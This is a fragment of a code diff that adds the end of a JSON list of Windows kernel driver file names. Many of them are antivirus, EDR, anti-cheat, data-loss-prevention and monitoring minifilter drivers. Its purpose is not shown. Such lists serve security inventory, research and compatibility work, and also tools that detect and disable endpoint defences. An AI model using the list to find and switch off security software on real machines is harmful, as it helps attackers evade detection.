+        "eeyehv.sys",
+        "eeyehv64.sys",
+        "egambit.sys",
+        "egfilterk.sys",
+        "egminflt.sys",
+        "egnfsflt.sys",
+        "ehdrv.sys",
+        "elock2fsctldriver.sys",
+        "emxdrv2.sys",
+        "enigmafilemondriver.sys",
+        "enmon.sys",
+        "epdrv.sys",
+        "epfw.sys",
+        "epfwwfp.sys",
+        "epicfilter.sys",
+        "epklib.sys",
+        "epp64.sys",
+        "epregflt.sys",
+        "eps.sys",
+        "epsmn.sys",
+        "equ8_helper.sys",
+        "eraser.sys",
+        "esensor.sys",
+        "esprobe.sys",
+        "estprmon.sys",
+        "estprp.sys",
+        "estregmon.sys",
+        "estregp.sys",
+        "estrkmon.sys",
+        "estrkr.sys",
+        "eventmon.sys",
+        "evmf.sys",
+        "evscase.sys",
+        "excfs.sys",
+        "exprevdriver.sys",
+        "failattach.sys",
+        "failmount.sys",
+        "fam.sys",
+        "fangcloud_autolock_driver.sys",
+        "fapmonitor.sys",
+        "farflt.sys",
+        "farwflt.sys",
+        "fasdriver",
+        "fcnotify.sys",
+        "fcontrol.sys",
+        "fdrtrace.sys",
+        "fekern.sys",
+        "fencry.sys",
+        "ffcfilt.sys",
+        "ffdriver.sys",
+        "fildds.sys",
+        "filefilter.sys",
+        "fileflt.sys",
+        "fileguard.sys",
+        "filehubagent.sys",
+        "filemon.sys",
+        "filemonitor.sys",
+        "filenamevalidator.sys",
+        "filescan.sys",
+        "filesharemon.sys",
+        "filesightmf.sys",
+        "filesystemcbt.sys",
+        "filetrace.sys",
+        "file_monitor.sys",
+        "file_protector.sys",
+        "file_tracker.sys",
+        "filrdriver.sys",
+        "fim.sys",
+        "fiometer.sys",
+        "fiopolicyfilter.sys",
+        "fjgsdis2.sys",
+        "fjseparettifilterredirect.sys",
+        "flashaccelfs.sys",
+        "flightrecorder.sys",
+        "fltrs329.sys",
+        "flyfs.sys",
+        "fmdrive.sys",
+        "fmkkc.sys",
+        "fmm.sys",
+        "fortiaptfilter.sys",
+        "fortimon2.sys",
+        "fortirmon.sys",
+        "fortishield.sys",
+        "fpav_rtp.sys",
+        "fpepflt.sys",
+        "fsafilter.sys",
+        "fsatp.sys",
+        "fsfilter.sys",
+        "fsgk.sys",
+        "fshs.sys",
+        "fsmon.sys",
+        "fsmonitor.sys",
+        "fsnk.sys",
+        "fsrfilter.sys",
+        "fstrace.sys",
+        "fsulgk.sys",
+        "fsw31rj1.sys",
+        "gagsecurity.sys",
+        "gbpkm.sys",
+        "gcffilter.sys",
+        "gddcv.sys",
+        "gefcmp.sys",
+        "gemma.sys",
+        "geprotection.sys",
+        "ggc.sys",
+        "gibepcore.sys",
+        "gkff.sys",
+        "gkff64.sys",
+        "gkpfcb.sys",
+        "gkpfcb64.sys",
+        "gofsmf.sys",
+        "gpminifilter.sys",
+        "groundling32.sys",
+        "groundling64.sys",
+        "gtkdrv.sys",
+        "gumhfilter.sys",
+        "gzflt.sys",
+        "hafsnk.sys",
+        "hbflt.sys",
+        "hbfsfltr.sys",
+        "hcp_kernel_acq.sys",
+        "hdcorrelatefdrv.sys",
+        "hdfilemon.sys",
+        "hdransomoffdrv.sys",
+        "hdrfs.sys",
+        "heimdall.sys",
+        "hexisfsmonitor.sys",
+        "hfileflt.sys",
+        "hiofs.sys",
+        "hmpalert.sys",
+        "hookcentre.sys",
+        "hooksys.sys",
+        "hpreg.sys",
+        "hsmltmon.sys",
+        "hsmltwhl.sys",
+        "hssfwhl.sys",
+        "hvlminifilter.sys",
+        "ibr2fsk.sys",
+        "iccfileioad.sys",
+        "iccfilteraudit.sys",
+        "iccfiltersc.sys",
+        "icfclientflt.sys",
+        "icrlmonitor.sys",
+        "iderafilterdriver.sys",
+        "ielcp.sys",
+        "ieslp.sys",
+        "ifs64.sys",
+        "ignis.sys",
+        "iguard.sys",
+        "iiscache.sys",
+        "ikfilesec.sys",
+        "im.sys",
+        "imffilter.sys",
+        "imfilter.sys",
+        "imgguard.sys",
+        "immflex.sys",
+        "immunetprotect.sys",
+        "immunetselfprotect.sys",
+        "inisbdrv64.sys",
+        "ino_fltr.sys",
+        "intelcas.sys",
+        "intmfs.sys",
+        "inuse.sys",
+        "invprotectdrv.sys",
+        "invprotectdrv64.sys",
+        "ionmonwdrv.sys",
+        "iothorfs.sys",
+        "ipcomfltr.sys",
+        "ipfilter.sys",
+        "iprotect.sys",
+        "iridiumswitch.sys",
+        "irongatefd.sys",
+        "isafekrnl.sys",
+        "isafekrnlmon.sys",
+        "isafermon",
+        "isecureflt.sys",
+        "isedrv.sys",
+        "isfpdrv.sys",
+        "isirmfmon.sys",
+        "isregflt.sys",
+        "isregflt64.sys",
+        "issfltr.sys",
+        "issregistry.sys",
+        "it2drv.sys",
+        "it2reg.sys",
+        "ivappmon.sys",
+        "iwdmfs.sys",
+        "iwhlp.sys",
+        "iwhlp2.sys",
+        "iwhlpxp.sys",
+        "jdppsf.sys",
+        "jdppwf.sys",
+        "jkppob.sys",
+        "jkppok.sys",
+        "jkpppf.sys",
+        "jkppxk.sys",
+        "k7sentry.sys",
+        "kavnsi.sys",
+        "kawachfsminifilter.sys",
+        "kc3.sys",
+        "kconv.sys",
+        "kernelagent32.sys",
+        "kewf.sys",
+        "kfac.sys",
+        "kfileflt.sys",
+        "kisknl.sys",
+        "klam.sys",
+        "klbg.sys",
+        "klboot.sys",
+        "kldback.sys",
+        "kldlinf.sys",
+        "kldtool.sys",
+        "klfdefsf.sys",
+        "klflt.sys",
+        "klgse.sys",
+        "klhk.sys",
+        "klif.sys",
+        "klifaa.sys",
+        "klifks.sys",
+        "klifsm.sys",
+        "klrsps.sys",
+        "klsnsr.sys",
+        "klupd_klif_arkmon.sys",
+        "kmkuflt.sys",
+        "kmnwch.sys",
+        "kmxagent.sys",
+        "kmxfile.sys",
+        "kmxsbx.sys",
+        "ksfsflt.sys",
+        "ktfsfilter.sys",
+        "ktsyncfsflt.sys",
+        "kubwksp.sys",
+        "lafs.sys",
+        "lbd.sys",
+        "lbprotect.sys",
+        "lcgadmon.sys",
+        "lcgfile.sys",
+        "lcgfilemon.sys",
+        "lcmadmon.sys",
+        "lcmfile.sys",
+        "lcmfilemon.sys",
+        "lcmprintmon.sys",
+        "ldsecdrv.sys",
+        "libwamf.sys",
+        "livedrivefilter.sys",
+        "llfilter.sys",
+        "lmdriver.sys",
+        "lnvscenter.sys",
+        "locksmith.sys",
+        "lragentmf.sys",
+        "lrtp.sys",
+        "magicbackupmonitor.sys",
+        "magicprotect.sys",
+        "majoradvapi.sys",
+        "marspy.sys",
+        "maxcryptmon.sys",
+        "maxproc64.sys",
+        "maxprotector.sys",
+        "mbae64.sys",
+        "mbam.sys",
+        "mbamchameleon.sys",
+        "mbamshuriken.sys",
+        "mbamswissarmy.sys",
+        "mbamwatchdog.sys",
+        "mblmon.sys",
+        "mcfilemon32.sys",
+        "mcfilemon64.sys",
+        "mcstrg.sys",
+        "mearwfltdriver.sys",
+        "message.sys",
+        "mfdriver.sys",
+        "mfeaack.sys",
+        "mfeaskm.sys",
+        "mfeavfk.sys",
+        "mfeclnrk.sys",
+        "mfeelamk.sys",
+        "mfefirek.sys",
+        "mfehidk.sys",
+        "mfencbdc.sys",
+        "mfencfilter.sys",
+        "mfencoas.sys",
+        "mfencrk.sys",
+        "mfeplk.sys",
+        "mfewfpk.sys",
+        "miniicpt.sys",
+        "minispy.sys",
+        "minitrc.sys",
+        "mlsaff.sys",
+        "mmpsy32.sys",
+        "mmpsy64.sys",
+        "monsterk.sys",
+        "mozycorpfilter.sys",
+        "mozyenterprisefilter.sys",
+        "mozyentfilter.sys",
+        "mozyhomefilter.sys",
+        "mozynextfilter.sys",
+        "mozyoemfilter.sys",
+        "mozyprofilter.sys",
+        "mpfilter.sys",
+        "mpkernel.sys",
+        "mpksldrv.sys",
+        "mpxmon.sys",
+        "mracdrv.sys",
+        "mrxgoogle.sys",
+        "mscan-rt.sys",
+        "msiodrv4.sys",
+        "msixpackagingtoolmonitor.sys",
+        "msnfsflt.sys",
+        "mspy.sys",
+        "mssecflt.sys",
+        "mtsvcdf.sys",
+        "mumdi.sys",
+        "mwac.sys",
+        "mwatcher.sys",
+        "mwfsmfltr.sys",
+        "mydlpmf.sys",
+        "namechanger.sys",
+        "nanoavmf.sys",
+        "naswsp.sys",
+        "ndgdmk.sys",
+        "neokerbyfilter",
+        "netaccctrl.sys",
+        "netaccctrl64.sys",
+        "netguard.sys",
+        "netpeeker.sys",
+        "ngscan.sys",
+        "nlcbhelpi64.sys",
+        "nlcbhelpx64.sys",
+        "nlcbhelpx86.sys",
+        "nlxff.sys",
+        "nmlhssrv01.sys",
+        "nmpfilter.sys",
+        "nntinfo.sys",
+        "novashield.sys",
+        "nowonmf.sys",
+        "npetw.sys",
+        "nprosec.sys",
+        "npxgd.sys",
+        "npxgd64.sys",
+        "nravwka.sys",
+        "nrcomgrdka.sys",
+        "nrcomgrdki.sys",
+        "nregsec.sys",
+        "nrpmonka.sys",
+        "nrpmonki.sys",
+        "nsminflt.sys",
+        "nsminflt64.sys",
+        "ntest.sys",
+        "ntfsf.sys",
+        "ntguard.sys",
+        "ntps_fa.sys",
+        "nullfilter.sys",
+        "nvcmflt.sys",
+        "nvmon.sys",
+        "nwedriver.sys",
+        "nxfsmon.sys",
+        "nxrmflt.sys",
+        "oadevice.sys",
+        "oavfm.sys",
+        "oczminifilter.sys",
+        "odfsfilter.sys",
+        "odfsfimfilter.sys",
+        "odfstokenfilter.sys",
+        "offsm.sys",
+        "omfltlh.sys",
+        "osiris.sys",
+        "ospfile_mini.sys",
+        "ospmon.sys",
+        "parity.sys",
+        "passthrough.sys",
+        "path8flt.sys",
+        "pavdrv.sys",
+        "pcpifd.sys",
+        "pctcore.sys",
+        "pctcore64.sys",
+        "pdgenfam.sys",
+        "pecfilter.sys",
+        "perfectworldanticheatsys.sys",
+        "pervac.sys",
+        "pfkrnl.sys",
+        "pfracdrv.sys",
+        "pgpfs.sys",
+        "pgpwdefs.sys",
+        "phantomd.sys",
+        "phdcbtdrv.sys",
+        "pkgfilter.sys",
+        "pkticpt.sys",
+        "plgfltr.sys",
+        "plpoffdrv.sys",
+        "pointguardvista64f.sys",
+        "pointguardvistaf.sys",
+        "pointguardvistar32.sys",
+        "pointguardvistar64.sys",
+        "procmon11.sys",
+        "proggerdriver.sys",
+        "psacfileaccessfilter.sys",
+        "pscff.sys",
+        "psgdflt.sys",
+        "psgfoctrl.sys",
+        "psinfile.sys",
+        "psinproc.sys",
+        "psisolator.sys",
+        "pwipf6.sys",
+        "pwprotect.sys",
+        "pzdrvxp.sys",
+        "qdocumentref.sys",
+        "qfapflt.sys",
+        "qfilter.sys",
+        "qfimdvr.sys",
+        "qfmon.sys",
+        "qminspec.sys",
+        "qmon.sys",
+        "qqprotect.sys",
+        "qqprotectx64.sys",
+        "qqsysmon.sys",
+        "qqsysmonx64.sys",
+        "qutmdrv.sys",
+        "ranpodfs.sys",
+        "ransomdefensexxx.sys",
+        "ransomdetect.sys",
+        "reaqtor.sys",
+        "redlight.sys",
+        "regguard.sys",
+        "reghook.sys",
+        "regmonex.sys",
+        "repdrv.sys",
+        "repmon.sys",
+        "revefltmgr.sys",
+        "reveprocprotection.sys",
+        "revonetdriver.sys",
+        "rflog.sys",
+        "rgnt.sys",
+        "rmdiskmon.sys",
+        "rmphvmonitor.sys",
+        "rpwatcher.sys",
+        "rrmon32.sys",
+        "rrmon64.sys",
+        "rsfdrv.sys",
+        "rsflt.sys",
+        "rspcrtw.sys",
+        "rsrtw.sys",
+        "rswctrl.sys",
+        "rswmon.sys",
+        "rtologon.sys",
+        "rtw.sys",
+        "ruaff.sys",
+        "rubrikfileaudit.sys",
+        "ruidiskfs.sys",
+        "ruieye.sys",
+        "ruifileaccess.sys",
+        "ruimachine.sys",
+        "ruiminispy.sys",
+        "rvsavd.sys",
+        "rvsmon.sys",
+        "rw7fsflt.sys",
+        "rwchangedrv.sys",
+        "ryfilter.sys",
+        "ryguard.sys",
+        "safe-agent.sys",
+        "safsfilter.sys",
+        "sagntflt.sys",
+        "sahara.sys",
+        "sakfile.sys",
+        "sakmfile.sys",
+        "samflt.sys",
+        "samsungrapidfsfltr.sys",
+        "sanddriver.sys",
+        "santa.sys",
+        "sascan.sys",
+        "savant.sys",
+        "savonaccess.sys",
+        "scaegis.sys",
+        "scauthfsflt.sys",
+        "scauthiodrv.sys",
+        "scensemon.sys",
+        "scfltr.sys",
+        "scifsflt.sys",
+        "sciptflt.sys",
+        "sconnect.sys",
+        "scred.sys",
+        "sdactmon.sys",
+        "sddrvldr.sys",
+        "sdvfilter.sys",
+        "se46filter.sys",
+        "secdodriver.sys",
+        "secone_filemon10.sys",
+        "secone_proc10.sys",
+        "secone_reg10.sys",
+        "secone_usb.sys",
+        "secrmm.sys",
+        "secufile.sys",
+        "secure_os.sys",
+        "secure_os_mf.sys",
+        "securofsd_x64.sys",
+        "sefo.sys",
+        "segf.sys",
+        "segiraflt.sys",
+        "segmd.sys",
+        "segmp.sys",
+        "sentinelmonitor.sys",
+        "serdr.sys",
+        "serfs.sys",
+        "sfac.sys",
+        "sfavflt.sys",
+        "sfdfilter.sys",
+        "sfpmonitor.sys",
+        "sgresflt.sys",
+        "shdlpmedia.sys",
+        "shdlpsf.sys",
+        "sheedantivirusfilterdriver.sys",
+        "sheedselfprotection.sys",
+        "shldflt.sys",
+        "si32_file.sys",
+        "si64_file.sys",
+        "sieflt.sys",
+        "simrep.sys",
+        "sisipsfilefilter",
+        "sk.sys",
+        "skyamdrv.sys",
+        "skyrgdrv.sys",
+        "skywpdrv.sys",
+        "slb_guard.sys",
+        "sld.sys",
+        "smbresilfilter.sys",
+        "smdrvnt.sys",
+        "sndacs.sys",
+        "snexequota.sys",
+        "snilog.sys",
+        "snimg.sys",
+        "snscore.sys",
+        "snsrflt.sys",
+        "sodatpfl.sys",
+        "softfilterxxx.sys",
+        "soidriver.sys",
+        "solitkm.sys",
+        "sonar.sys",
+        "sophosdt2.sys",
+        "sophosed.sys",
+        "sophosntplwf.sys",
+        "sophossupport.sys",
+        "spbbcdrv.sys",
+        "spellmon.sys",
+        "spider3g.sys",
+        "spiderg3.sys",
+        "spiminifilter.sys",
+        "spotlight.sys",
+        "sprtdrv.sys",
+        "sqlsafefilterdriver.sys",
+        "srminifilterdrv.sys",
+        "srtsp.sys",
+        "srtsp64.sys",
+        "srtspit.sys",
+        "ssfmonm.sys",
+        "ssrfsf.sys",
+        "ssvhook.sys",
+        "stcvsm.sys",
+        "stegoprotect.sys",
+        "stest.sys",
+        "stflt.sys",
+        "stkrnl64.sys",
+        "storagedrv.sys",
+        "strapvista.sys",
+        "strapvista64.sys",
+        "svcbt.sys",
+        "swcommfltr.sys",
+        "swfsfltr.sys",
+        "swfsfltrv2.sys",
+        "swin.sys",
+        "symafr.sys",
+        "symefa.sys",
+        "symefa64.sys",
+        "symefasi.sys",
+        "symevent.sys",
+        "symevent64x86.sys",
+        "symevnt.sys",
+        "symevnt32.sys",
+        "symhsm.sys",
+        "symrg.sys",
+        "sysdiag.sys",
+        "sysmon.sys",
+        "sysmondrv.sys",
+        "sysplant.sys",
+        "szardrv.sys",
+        "szdfmdrv.sys",
+        "szdfmdrv_usb.sys",
+        "szedrdrv.sys",
+        "szpcmdrv.sys",
+        "taniumrecorderdrv.sys",
+        "taobserveflt.sys",
+        "tbfsfilt.sys",
+        "tbmninifilter.sys",
+        "tbrdrv.sys",
+        "tdevflt.sys",
+        "tedrdrv.sys",
+        "tenrsafe2.sys",
+        "tesmon.sys",
+        "tesxnginx.sys",
+        "tesxporter.sys",
+        "tffregnt.sys",
+        "tfsflt.sys",
+        "tgfsmf.sys",
+        "thetta.sys",
+        "thfilter.sys",
+        "threatstackfim.sys",
+        "tkdac2k.sys",
+        "tkdacxp.sys",
+        "tkdacxp64.sys",
+        "tkfsavxp.sys",
+        "tkfsavxp64.sys",
+        "tkfsft.sys",
+        "tkfsft64.sys",
+        "tkpcftcb.sys",
+        "tkpcftcb64.sys",
+        "tkpl2k.sys",
+        "tkpl2k64.sys",
+        "tksp2k.sys",
+        "tkspxp.sys",
+        "tkspxp64.sys",
+        "tmactmon.sys",
+        "tmcomm.sys",
+        "tmesflt.sys",
+        "tmevtmgr.sys",
+        "tmeyes.sys",
+        "tmfsdrv2.sys",
+        "tmkmsnsr.sys",
+        "tmnciesc.sys",
+        "tmpreflt.sys",
+        "tmumh.sys",
+        "tmums.sys",
+        "tmusa.sys",
+        "tmxpflt.sys",
+        "topdogfsfilt.sys",
+        "trace.sys",
+        "trfsfilter.sys",
+        "tritiumfltr.sys",
+        "trpmnflt.sys",
+        "trufos.sys",
+        "trustededgeffd.sys",
+        "tsifilemon.sys",
+        "tss.sys",
+        "tstfilter.sys",
+        "tstfsredir.sys",
+        "tstregredir.sys",
+        "tsyscare.sys",
+        "tvdriver.sys",
+        "tvfiltr.sys",
+        "tvmfltr.sys",
+        "tvptfile.sys",
+        "tvspfltr.sys",
+        "twbdcfilter.sys",
+        "txfilefilter.sys",
+        "txregmon.sys",
+        "uamflt.sys",
+        "ucafltdriver.sys",
+        "ufdfilter.sys",
+        "uncheater.sys",
+        "upguardrealtime.sys",
+        "usbl_ifsfltr.sys",
+        "usbpdh.sys",
+        "usbtest.sys",
+        "uvmcifsf.sys",
+        "uwfreg.sys",
+        "uwfs.sys",
+        "v3flt2k.sys",
+        "v3flu2k.sys",
+        "v3ift2k.sys",
+        "v3iftmnt.sys",
+        "v3mifint.sys",
+        "varpffmon.sys",
+        "vast.sys",
+        "vcdriv.sys",
+        "vchle.sys",
+        "vcmfilter.sys",
+        "vcreg.sys",
+        "veeamfct.sys",
+        "vfdrv.sys",
+        "vfilefilter.sys",
+        "vfpd.sys",
+        "vfsenc.sys",
+        "vhddelta.sys",
+        "vhdtrack.sys",
+        "vidderfs.sys",
+        "vintmfs.sys",
+        "virtfile.sys",
+        "virtualagent.sys",
+        "vk_fsf.sys",
+        "vlflt.sys",
+        "vmwvvpfsd.sys",
+        "vollock.sys",
+        "vpdrvnt.sys",
+        "vradfil2.sys",
+        "vraptdef.sys",
+        "vraptflt.sys",
+        "vrarnflt.sys",
+        "vrbbdflt.sys",
+        "vrexpdrv.sys",
+        "vrfsftm.sys",
+        "vrfsftmx.sys",
+        "vrnsfilter.sys",
+        "vrsdam.sys",
+        "vrsdcore.sys",
+        "vrsdetri.sys",
+        "vrsdetrix.sys",
+        "vrsdfmx.sys",
+        "vrvbrfsfilter.sys",
+        "vsepflt.sys",
+        "vsscanner.sys",
+        "vtsysflt.sys",
+        "vxfsrep.sys",
+        "wats_se.sys",
+        "wbfilter.sys",
+        "wcsdriver.sys",
+        "wdcfilter.sys",
+        "wdfilter.sys",
+        "wdocsafe.sys",
+        "wfp_mrt.sys",
+        "wgfile.sys",
+        "whiteshield.sys",
+        "windbdrv.sys",
+        "windd.sys",
+        "winfladrv.sys",
+        "winflahdrv.sys",
+        "winfldrv.sys",
+        "winfpdrv.sys",
+        "winload.sys",
+        "winteonminifilter.sys",
+        "wiper.sys",
+        "wlminisecmod.sys",
+        "wntgpdrv.sys",
+        "wraekernel.sys",
+        "wrcore.sys",
+        "wrcore.x64.sys",
+        "wrdwizfileprot.sys",
+        "wrdwizregprot.sys",
+        "wrdwizscanner.sys",
+        "wrdwizsecure64.sys",
+        "wrkrn.sys",
+        "wrpfv.sys",
+        "wsafefilter.sys",
+        "wscm.sys",
+        "xcpl.sys",
+        "xendowflt.sys",
+        "xfsgk.sys",
+        "xhunter1.sys",
+        "xhunter64.sys",
+        "xiaobaifs.sys",
+        "xiaobaifsr.sys",
+        "xkfsfd.sys",
+        "xoiv8x64.sys",
+        "xomfcbt8x64.sys",
+        "yahoostorage.sys",
+        "yfsd.sys",
+        "yfsd2.sys",
+        "yfsdr.sys",
+        "yfsrd.sys",
+        "zampit_ml.sys",
+        "zesfsmf.sys",
+        "zqfilter.sys",
+        "zsfprt.sys",
+        "zwasatom.sys",
+        "zwpxesvr.sys",
+        "zxfsfilt.sys",
+        "zyfm.sys",
+        "zzpensys.sys"
+    ]
+}
+
+
